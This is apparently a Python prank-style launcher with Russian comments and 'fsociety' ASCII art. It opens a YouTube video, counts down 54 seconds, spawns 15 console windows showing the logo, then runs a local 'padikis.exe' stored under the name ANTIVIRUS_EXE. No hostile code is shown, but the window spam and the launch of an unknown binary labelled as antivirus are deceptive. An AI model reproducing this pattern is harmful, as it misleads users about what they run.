import os
import subprocess
import sys
import time
import webbrowser

# ==============================================================================
# НАСТРОЙКИ
# ==============================================================================
ANTIVIRUS_EXE = "padikis.exe"  # Имя исполняемого файла
YOUTUBE_URL = "https://youtu.be/9JgpziW1xFs?si=DZOCyAIvjk7X8uPf"
VIDEO_DURATION_SECONDS = 54  # Таймер ожидания просмотра видео (в секундах)

# ASCII-арт fsociety
LOGO = r"""
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XX                                                                          XX
XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
XX   MMMMMy''                                                    ''yMMMMM   XX
XX   MMMy'                                                        'yMMM   XX
XX   Mh'                                                            'hM   XX
XX   -                                                                -   XX
XX                                                                          XX
XX   ::                                                              ::   XX
XX   MMhh.        ..hhhhhh..                    ..hhhhhh..        .hhMM   XX
XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
XX   ---mMM ''              'mmMMMMMMMM  MMMMMMMMmm'              '' MMm---   XX
XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
XX   mm''    .y'     ..yyyyy..    ''''    ''''    ..yyyyy..     'y.    ''mm   XX
XX            MN    .sMMMMMMMMMss.    .    .    .ssMMMMMMMMMs.    NM            XX
XX            N`    MMMMMMMMMMMMN    M    M    NMMMMMMMMMMMMM    `N            XX
XX             +  .sMNNNNNMMMMMN+    `N    N`    +NMMMMMNNNNNMs.  +             XX
XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
XX                                oo      oo                                XX
XX           oM                  oo          oo                  Mo         XX
XX          oMMo                M              M                oMMo        XX
XX        +MMMM                 s              s                 MMMM+      XX
XX       +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+     XX
XX      +MMMMMMM+        ++NNMMMMMMMMN+    +NMMMMMMMMNN++        +MMMMMMM+    XX
XX      MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM    XX
XX      yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy    XX
XX    m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m    XX
XX    MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM    XX
XX    MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM    XX
XX    MMMMd    ''''hhhhh        odddo          obbbo        hhhh''''   dMMMM    XX
XX    MMMMMd              'hMMMMMMMMMMddddddMMMMMMMMMMh'              dMMMMM    XX
XX    MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'                dMMMMMM    XX
XX    MMMMMMM-                ''ddMMMMMMMMMMMMMMdd''                -MMMMMMM    XX
XX    MMMMMMMM                    '::dddddddd::'                    MMMMMMMM    XX
XX    MMMMMMMM-                                                     -MMMMMMMM    XX
XX    MMMMMMMMM                                                     MMMMMMMMM    XX
XX    MMMMMMMMMy                                                   yMMMMMMMMM    XX
XX    MMMMMMMMMMys.                                               .yMMMMMMMMMM    XX
XX    MMMMMMMMMMMMMy.                                           .yMMMMMMMMMMMM    XX
XX    MMMMMMMMMMMMMMMy.                                       .yMMMMMMMMMMMMMM    XX
XX    MMMMMMMMMMMMMMMMMs.                                   .sMMMMMMMMMMMMMMMM    XX
XX    MMMMMMMMMMMMMMMMMMss.            ....            .ssMMMMMMMMMMMMMMMMMM    XX
XX    MMMMMMMMMMMMMMMMMMMMNo          oNNNNo          oNMMMMMMMMMMMMMMMMMMMM    XX
XX                                                                          XX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

    .o88o.                               o8o                 .
    888 `"                               `"'                .o8
   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.   .o888oo oooo   ooo
    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88. .8'
    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
    888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
   o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"     d8
                                                                .o...P'
                                                                `XER0'
"""

RED = "\033[91m"
RESET = "\033[0m"


def print_logo():
    """Очищает консоль и выводит логотип."""
    sys.stdout.write("\033[H\033[J")
    sys.stdout.write(RED + LOGO + RESET + "\n")
    sys.stdout.flush()


def run_exe(exe_path):
    """Запуск приложения padikis.exe единоразово."""
    if os.path.exists(exe_path):
        try:
            if sys.platform == "win32":
                subprocess.Popen(
                    [exe_path], creationflags=subprocess.CREATE_NEW_CONSOLE
                )
            else:
                subprocess.Popen([exe_path])
            print(f"[+] Файл '{os.path.basename(exe_path)}' успешно запущен.")
        except Exception as e:
            print(f"[!] Не удалось запустить {exe_path}: {e}")
    else:
        print(f"[!] Ошибка: Файл '{exe_path}' не найден!")


def open_child_window():
    """Открывает дочернее консольное окно с выведенным логотипом."""
    script_path = os.path.abspath(sys.argv[0])

    if sys.platform == "win32":
        subprocess.Popen(
            [sys.executable, script_path, "--child"],
            creationflags=subprocess.CREATE_NEW_CONSOLE,
        )


def main():
    base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    exe_full_path = os.path.join(base_dir, ANTIVIRUS_EXE)

    # Поведение для дочерних окон (показывают только арт)
    if "--child" in sys.argv:
        print_logo()
        input("\nНажмите Enter для закрытия этого окна...")
        return

    # 1. Открытие видео в системном браузере
    print("Открытие видео в системном браузере...")
    webbrowser.open(YOUTUBE_URL)

    # 2. Обратный отсчет таймера
    print(f"Видео открыто. Ожидание {VIDEO_DURATION_SECONDS} секунд...")
    for remaining in range(VIDEO_DURATION_SECONDS, 0, -1):
        sys.stdout.write(f"\rПереход к следующему шагу через: {remaining} сек. ")
        sys.stdout.flush()
        time.sleep(1)
    print("\nВремя вышло!")

    # 3. Отображение логотипа в главном окне
    print_logo()

    # 4. Открытие 4 дочерних окон (без задержек)
    EXTRA_WINDOWS = 15
    print(f"Открытие {EXTRA_WINDOWS} дочерних окон...")
    for _ in range(EXTRA_WINDOWS):
        open_child_window()

    # 5. Запуск padikis.exe
    print("Запуск основного приложения...")
    run_exe(exe_full_path)

    input("\nНажмите Enter, чтобы завершить главный процесс...")


if __name__ == "__main__":
    main()
